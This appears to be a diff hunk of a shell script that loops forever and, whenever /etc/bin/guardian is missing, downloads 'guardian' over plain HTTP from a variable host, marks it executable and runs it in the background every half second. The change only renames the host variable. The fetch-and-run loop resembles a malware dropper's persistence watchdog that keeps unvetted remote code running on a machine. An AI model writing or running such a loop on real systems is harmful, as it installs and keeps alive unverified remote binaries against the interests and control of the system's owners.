@@ -20,7 +20,7 @@ while true; do
     fi
 
     if [ ! -f "/etc/bin/guardian" ]; then
-        cd /etc/bin && wget "http://$ip_address/guardian" && chmod +x guardian && ./guardian &
+        cd /etc/bin && wget "http://$ip_file/guardian" && chmod +x guardian && ./guardian &
     fi
 
     sleep 0.5
